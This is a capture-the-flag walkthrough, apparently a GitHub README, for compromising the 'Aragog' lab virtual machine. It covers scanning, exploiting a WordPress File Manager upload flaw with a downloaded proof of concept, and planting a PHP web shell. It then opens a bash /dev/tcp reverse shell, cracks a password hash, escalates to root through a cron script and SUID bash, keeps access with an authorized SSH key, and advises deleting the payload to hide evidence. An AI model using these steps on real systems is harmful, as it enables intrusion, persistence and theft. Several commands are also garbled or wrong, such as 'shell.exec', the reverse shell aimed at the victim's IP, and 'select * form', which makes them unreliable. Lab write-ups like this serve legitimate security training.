## Aragog machine
We start with the Aragog machine, since it is the one found on our network. First we must find it and to do this we will need to become root.
If you want to learn how to violate it, follow the steps as indicated.

# 1. NETWORK
```
sudo nano /etc/network/interface
```
It has to look like the image shows.

![1 cap_red](https://github.com/Vicctoriaa/VISMA.en/assets/153718557/19421e89-5d44-4ce0-bdd0-725cd4991c59)

In case we want to know what we have put in the interface we can use the following command:
```
cat /etc /network/interface
```
We restart the machine, and we go to our main machine, it is important to have the Aragog turned on so that it can find our IP, to know what IP it has we will scan the network
putting the following command:
```
arp-scan -I ens33 –localnet 
```
If we only want to search for the machine, and we are using VmWare, we can add the `grep` command and put the following in quotes:
```
arp-scan -I ens33 –localnet | grep "VMware, Inc."
```
![2 cap_arp scan](https://github.com/Vicctoriaa/VISMA.en/assets/153718557/b4c57bed-a656-4d79-8805-402de48c7649)

# 2. ATTACK

We will check if the machine is active or if there is a firewall blocking ICMP traces, to do this we must do a 'ping'.
```
ping -c 1 IP_OF_THE_ARAGOG
```
![3 cap_ping](https://github.com/Vicctoriaa/VISMA.en/assets/153718557/16e0697a-15a9-4ac6-951e-28d930a94ae0)

Once we have sent a ping, we can check that the machine is on, we also see that the ttl = 64 so it is a Linux machine, if the ttl is “=” or less than 64 it means that we are probably facing a Linux machine.
We can also observe that no packet has been discarded, so we already know that it is in the same network segment and is ready to be compromised.

Once we have that information, we will have to do a port scan. For this we will use the nmap tool, specialized in scanning ports, we will set parameters since we only want specific things. (if you want to know about the parameters go here:.....)  
```
nmap -sS -p --open -T5 --min-rate 5000 IP_DE_LA_ARAGOG -n -Pn -vvv -oG
```
![4 cap_nmap1](https://github.com/Vicctoriaa/VISMA.en/assets/153718557/5983bfff-cc8d-4bf3-acb2-c14af734de18)

Once we have finished with the port scan, we must now detect which services or versions are running on these ports. To do this, once we have the open ports copied to the clipboard
```
nmap -sCV -p22,80 IP_DE_LA_ARAGOG -oN portServices
```
![5 cap_nmap2](https://github.com/Vicctoriaa/VISMA.en/assets/153718557/3c267b49-8f51-4bd2-95a3-217563461edb)

Once the scan is done we find that port 22 is running ssh, but since we do not have any key at the moment we cannot do anything and a brute force attack would take a long time, so we leave it as the last option. We find that Apache is running on port 80, which means that there is a website running behind it.

If we look for the IP of the machine with port 80 we find the following

![6 cap_ipnavegadorWEB](https://github.com/Vicctoriaa/VISMA.en/assets/153718557/1ffcfab5-f45c-4c4f-b9e3-0267088aba5e)

At first we don't see anything that catches our attention so let's look at the source code to see if there is anything interesting, to do this we will click on ctrl + u

![7 cap_ctrl_U_web](https://github.com/Vicctoriaa/VISMA.en/assets/153718557/a909a734-ee9a-4208-8fdf-ffaba09c0b39)

And we found nothing. The next thing to test would be the subdomains, but here we do not have a domain or DNS server to ask the possible subdomains or subdomains indexed by the SSL certificate. So we will do fuzzing, this will help us determine if there is a hidden directory within the web server. To do this we will use `gobuster`, although we can also use tools like `fuff` or `wfuzz`.
(In case it is not installed you can see how it is installed here......and to know what each parameter is, go here......)
```
gobuster dir -u http://IP_DE_LA_ARAGOG:80 -w /usr/share/Discovery/Web-Content/directory-list-2.3-medium.txt -t 400 -x html,php,jpg,png,png,txt,docx,pdf 2>/dev/null
```
![8 cap_gobuster1](https://github.com/Vicctoriaa/VISMA.en/assets/153718557/9462f66e-30f1-42dd-ab22-eb7f2850c7b3)

Once the scan is finished we find that the directory “/blog” and “/javascript” redirect us elsewhere while “/server-status” returns a 403 (the server receives the request but denies access to the action), yes We enter the java script, it will give us an error called FORBIDDEN, however if we enter the blog we see the website

![9 cap_web blog](https://github.com/Vicctoriaa/VISMA.en/assets/153718557/3af2c0c0-384a-4e21-a6db-bb0a24343712)

We can see that it is a Wordpress[^1] page, but for some reason the website is not loading the “css”[^2] styles, so first we are going to review the source code.
First, looking for comments from a developer that gives us valuable information and then we will search the "head" to see what happens and why it does not call the CSS style correctly, as we did previously, ctrl + u

![10 cap_CSS](https://github.com/Vicctoriaa/VISMA.en/assets/153718557/8e25c874-fc9e-4951-aadd-ce0bfb141e4c)

Since it calls the styles from a domain, in order to resolve it we must add the domain wordpress.aragog.hogwarts and aragog.hogwarts, so that our PC is able to resolve the domain, in the following directory:
```
sudo nano /etc/hosts
```
![11 cap_poner dominio CSS](https://github.com/Vicctoriaa/VISMA.en/assets/153718557/c0cb7bd3-0350-4af5-9c2a-0078999d79ef)

Now if we search for the domain “wordpress.aragog.hogwarts” in the browser, the website will appear correctly.

This is what wappalyzer[^3] reports to us on the web

![12_wappalyzer](https://github.com/Vicctoriaa/VISMA.en/assets/153718557/44d704a4-e29c-42e6-be27-6d605858113b)

We can see that this page has wordpress, if we try to enter the “wp-content” directory
```
http://wordpress.aragog.hogwarts/blog/wp-content/
```
To see if we have directory listing, in order to have directory listing on a website, the following requirements must be met:
* Does not contain a file called “index.html”
* And it does not contain a “.htacces” file, this file serves to block access to the directory listing itself.

Since what we wanted was to search for WordPress plugins that were vulnerable, we will try another tool called `WPscan`[^4]
```
-wpscan --url http://wordpress.aragog.hogwarts/blog/ --enumerate u,vp --plugin-detection agressive --api-token=$wpapi
```
We can find that it has detected several plugins with vulnerabilities, but of all of those, the one that catches my attention the most is one that allows me to upload files without authenticating myself and that from there can lead to remote execution of commands.
On this [website](https://wpscan.com/vulnerability/e528ae38-72f0-49ff-9878-922eff59ace9/) they leave us a POC (proof of concept) where within this we have the Python script that allows us to upload files remotely.
To download it we will do a `wget` of the file
```
wget https://ypcs.fi/misc/code/pocs/2020-wp-file-manager-v67.py
```
If we do a `cat` plus the file that we just installed we can see the python code and understand what its function is.
We create a file called `payload.php` where we will add the following lines.
```
sudo nano payload.php
```
Where we will add the following lines.
```php
<?php
echo "<pre>" . shell.exec($_REQUEST['cmd']) . "</pre>";
?>
```
we save (ctrl + s) and exit (ctrl + x)
Now we have to add the script to the URL of the website, enter the following command.
```
python3 2020-wp-file-manager-v67.py http://wordpress.aragog.hogwarts/blog/
```
If we enter the url: `http://wordpress.aragog.hogwarts/blog/wp-content/plugins/wp-file-manager/lib/php/../files/payload.php` It will not show us anything since we have to put a command at the end of the link adding it to the end of the url `cmd=COMMAND_WE_WANT`

![13 cap_cmdURL](https://github.com/Vicctoriaa/VISMA.en/assets/153718557/7f8d686a-65c0-4013-8093-b3d88d91e707)
> This example shows the command `hostname -l` that tells us the IP

Once we have verified that it has 2 network interfaces we are going to initiate a reverse shell.
To do this we go to port 443 and put a one liner for a reverse Shell:
```
bash -c "bash -i >& /dev/tcp/IP_DE_LA_ARAGOG/443 0>&1"
```
Once we execute the command we can see that we have obtained a reverse shell
```
nc -nvlp 443
```
This Shell is not completely interactive since we cannot do ctrl c, ctrl l, ctrl u, we cannot use the arrows to go to the command history, etc...
To solve this, tty treatment is done. With tty treatment we basically refer to the configuration and management of the terminal.
To do this you have to do the following commands
```
‎script /dev/null -c bash
```
ctrl + z
```
stty raw -echo; fg
reset xterm
```
‎Once this is done we only have to reset the size of the terminal, for that we must first know the size of our terminal so in a separate terminal we execute the command `stty size`

We reset the TERM environment variable so that it is equal to “xterm”, xterm is a widely used terminal emulator that allows us to clear the screen with the “ctrl + L” hotkeys, use “ctrl + C”, be able to use the arrows to move, etc.
```
expot TERM=xterm s$ -sitty rows 64 columns 253wordpress/wp-content/plugins/wp-file-manager/lib/files
```
Once that is done, we reset the size of the terminal to our window size and that's it. We already have a fully interactive reverse shell that if we do “ctrl + c” it does not close.

We go to home, in case we are not inside we do `cd /home/`
When we do `ls` we see a directory called hagrid98, if we repeat the `ls` command we see the .txt, to see it we will `cat horcrux1.txt`.

We find that it is in base64, so to convert it to human readable text we must execute the command:
```
echo “texto en base 64” | base64 -d; echo
```
> The -d is to decode it and the final fact is to reset the output.

![14 cap_hagrid](https://github.com/Vicctoriaa/VISMA.en/assets/153718557/0d66a48f-a901-448b-9a37-05500d453f98)

We will search if we find something useful, since Apache is running we must look for the Apache directory that `“/etc/apache2”` once inside we find that there is a directory called `“sites-enabled”` we enter and inside there is a wordpress.conf, When doing a `cat` it reveals that the directory where the wordpress is mounted is `“/usr/share/wordpress”`. If we enter, we find that there is an interesting directory called `“wp-content”`, if we enter and go to in `plugins>wp-file-manager>lib>files` we find our `payload.php`, for now we will not delete it because without it we cannot have the reverse Shell, but once we scale and have an ssh connection we must delete it to leave less evidence.
```
cd /etc/apache2/sites/enabled
cat worpress.conf
```
```
cd /usr/share/wordpress & ls
```
```
cd /plugins/wp-file-manager/lib/files
```
Once inside with the `ls` command we can see that there is a `wp-config.php` file, we will look at what is inside it as we have done previously using the `cat` command.

```
cat wp-config-php
```
A file like the one we will see below will be displayed:
```php
<?php
/***
 * WordPress's Debianised default master config file
 * Please do NOT edit and learn how the configuration works in
 * /usr/share/doc/wordpress/README.Debian
 ***/

/* Look up a host-specific config file in
 * /etc/wordpress/config-<host>.php or /etc/wordpress/config-<domain>.php
 */
$debian_server = preg_replace('/:.*/', "", $_SERVER['HTTP_HOST']);
$debian_server = preg_replace("/[^a-zA-Z0-9.\-]/", "", $debian_server);
$debian_file = '/etc/wordpress/config-'.strtolower($debian_server).'.php';
/* Main site in case of multisite with subdomains */
$debian_main_server = preg_replace("/^[^.]*\./", "", $debian_server);
$debian_main_file = '/etc/wordpress/config-'.strtolower($debian_main_server).'.php';

if (file_exists($debian_file)) {
    require_once($debian_file);
    define('DEBIAN_FILE', $debian_file);
} elseif (file_exists($debian_main_file)) {
    require_once($debian_main_file);
    define('DEBIAN_FILE', $debian_main_file);
} elseif (file_exists("/etc/wordpress/config-default.php")) {
    require_once("/etc/wordpress/config-default.php");
    define('DEBIAN_FILE', "/etc/wordpress/config-default.php");
} else {
    header("HTTP/1.0 404 Not Found");
    echo "Neither <b>$debian_file</b> nor <b>$debian_main_file</b> could be found. <br/> Ensure one of them exists, is readable by the webserver and contains the right password/username.";
    exit(1);
}

/* Default value for some constants if they have not yet been set
   by the host-specific config files */
if (!defined('ABSPATH'))
    define('ABSPATH', '/usr/share/wordpress/');
if (!defined('WP_CORE_UPDATE'))
    define('WP_CORE_UPDATE', false);
if (!defined('WP_ALLOW_MULTISITE'))
    define('WP_ALLOW_MULTISITE', true);
if (!defined('DB_NAME'))
    define('DB_NAME', 'wordpress');
if (!defined('DB_USER'))
    define('DB_USER', 'wordpress');
if (!defined('DB_HOST'))
    define('DB_HOST', 'localhost');
if (!defined('WP_CONTENT_DIR') && !defined('DONT_SET_WP_CONTENT_DIR'))
    define('WP_CONTENT_DIR', '/var/lib/wordpress/wp-content');

/* Default value for the table_prefix variable so that it doesn't need to
   be put in every host-specific config file */
if (!isset($table_prefix)) {
    $table_prefix = 'wp_';
}

if (isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] == 'https')
    $_SERVER['HTTPS'] = 'on';

require_once(ABSPATH . 'wp-settings.php');
?>
```

We observe that the file names `“/etc/wordpress/config-default.php"`, what we will do is investigate it as we are not sure what it contains and we do not want to lose anything, use the command `pushd /etc/wordpress/ `[^6]
When we do this we find the htacces file, which is the one that does not allow us to have directory listing on the web, and the file we came from called “config-default.php”. If we do a cat we find that we have some credentials.

![15 cap_pushd](https://github.com/Vicctoriaa/VISMA.en/assets/153718557/241afe75-2f7e-42a9-a6b4-e7b94341c394)
> Normally in WordPress a file called wp-config.php is used to configure the database with the entries. You also configure the cache, email language, session cookies...

In this case, since it is another config file, I assume that it is the password for a database, we will start with the most typical `mysql` and to find out if it exists we will simply do a `ps aux`[^7] and filter by `mysql`
```
ps aux | grep mysql
```
![16 cap_ps aux](https://github.com/Vicctoriaa/VISMA.en/assets/153718557/aad1feb6-aa5f-4c18-bb4f-18fe69dd298e)

In this case we find that we are facing mysql so we are going to try to log in

If we put `mysql` it tells us that our user does not have access and if we do, `mysql –help` shows us parameters that allow us to change the username and password we log in to.
So next we will put this command.
```
mysql -uroot -p
```
Once logged in we are going to see what databases we have, using the `show databases;` command, we enter the WordPress database since the site is set up in WordPress, executing `show tables;`.

![17 cap_mariaDB](https://github.com/Vicctoriaa/VISMA.en/assets/153718557/e314af1a-61b6-4298-a100-317470cdfd8f)

Within this we have several tables, we are going to enter the wp_users table, if we do a `describe wp_users` to see its columns we obtain the following:

![18 cap_mariaUsers](https://github.com/Vicctoriaa/VISMA.en/assets/153718557/baad0e15-7417-4b36-bc72-12d5d78f61c6)

We'll list what's inside.
```
select * form wp_users;
```
![19 cap_select USERS](https://github.com/Vicctoriaa/VISMA.en/assets/153718557/a7ab6213-8d39-4419-aa0c-ef2e83eddc68)

If we look closely we see that the password of the user hagrid98 is hashed, we know this since it begins with a `$P$` since it is a characteristic format of systems such as PHP and WordPress. We will try to take it to the `/Resources/Credentials` directory and put it in a file called `hash`.
```
mkdir Resources
cd !$
mdkir Credentials
cd !$
```
```
nvim hash
catn hash
```
Once inside we are going to use a tool called `john` next to the `rockyou` dictionary that is located in the absolute path `/usr/share/wordlists/rockyou.txt`.
```
john -w:/usr/share/wordlists/rockyou.txt hash
```
![20 cap_john1](https://github.com/Vicctoriaa/VISMA.en/assets/153718557/edd7a3c8-ef2e-4892-b454-6d05b1e1cf40)

We can see that the john tool has found us hagrid98's password, which is password123. Once we have the username and password we will try to connect via `ssh`.
```
ssh hagrid98@IP_DE_LA_ARAGOG
```
![21 cap_ssh](https://github.com/Vicctoriaa/VISMA.en/assets/153718557/f1830675-9a16-4c7b-b693-4b91f3fd8f05)
> We see that it allows us to connect, it is important to enter the password that we found previously and not that of our machine.

# 3. Privilege escalation

We must try to escalate privileges either to root or to ginny (that way she has more privileges), the first thing we are going to do is check if there are any files with SUID[^8] (4000) permissions, we execute the following command to see what permissions we have.
```
find / -perm -4000 2>/dev/null
```
We haven't found anything, so now let's look for scripts we own:
```
find / -user hagrid98 2>/dev/null
```
We found that almost all of them are from system process paths or things similar, but there is a file in the `/opt/` directory that draws attention because apart from being in the path, it is a bash script where the owner is hagrid98

Apparently it moves everything from one directory to another, I don't think I'm going to run it by hand since otherwise the script wouldn't be done so we're going to assume it's a cron task and since hagrid98 doesn't have cron tasks because the cron task is executed by root or ginny, so let's add a line where we make /bin/bash become suid and thus know if it is root that is executing the task.
```
cat /opt/.backup.sh
```
```
watch -n 1 ls -l
```
We see that if it is in root, knowing that we already have the path with SUID permissions, we execute `bash -p`, it will allow us to execute bash as the owner. We observe the following:

![22 cap_bash-p](https://github.com/Vicctoriaa/VISMA.en/assets/153718557/6e481c99-84b9-4c23-9e22-18bb6c2ea985)

If we open the last flag we see, with the command `cat horcrux2.txt` it congratulates us 😊👍
Since we have managed to completely violate the maqona. If we want to enter as many times as we want without a password, we explain it in the next point.

# 4. Enter without password

We create a public key on our ssh computer and we will put it in the `/root/.ssh` directory
```
sudo nano id:rsa.pub
```
Once created, we remove the line break from the `/root/.ssh/id_rsa.pub` file, execute the following command:
```
cat /root/.ssh/id_rsa.pub | tr '\\n'
```
And we copy it to the clipboard
```
cat /root/.ssh/id_rsa.pub | tr '\\n' | xclip -sel clip
```
We open a file called ".ssh/authorized_keys" with nano and paste the key (victim machine)

![23 cap_pegarCLAVE](https://github.com/Vicctoriaa/VISMA.en/assets/153718557/9481b114-d01b-449e-b424-c800e8d2bcfd)

We already have access, we can connect as root@IP_OF_THE_ARAGOG

![24 cap_finalCLAVE](https://github.com/Vicctoriaa/VISMA.en/assets/153718557/47124fe9-a152-4eab-b3c2-5aa971af388e)

> [!CAUTION]
> If you are afraid of spiders, any phobia, seeing a spider/taratula may affect you in some way, do not download this text any further, since the machine refers to the Harry Potter spider.




[^1]: It has Wordpress Comment and Wp-Admin which is a very common wordpress user apart from the fact that it says “Proudly powered by Wordpress”.
[^2]: language that manages the design and presentation of web pages, that is, how they look when a user visits them.
[^3]: It inspects the internal data of the websites, identifying the programming that has been used to develop it. It is also an extension that we have to add by searching for it directly from the Internet.
[^4]: tool specialized in scanning WordPress pages for vulnerabilities.
[^5]: Particular command line user interface used to communicate with the Linux kernel.
[^6]: which allows us to cd to a directory but if we want to return to the one we were in we just have to put “popd”.
[^7]: the ps aux command allows us to see running processes.
[^8]: These are access permissions that can be assigned to files or directories in a Unix-based operating system.


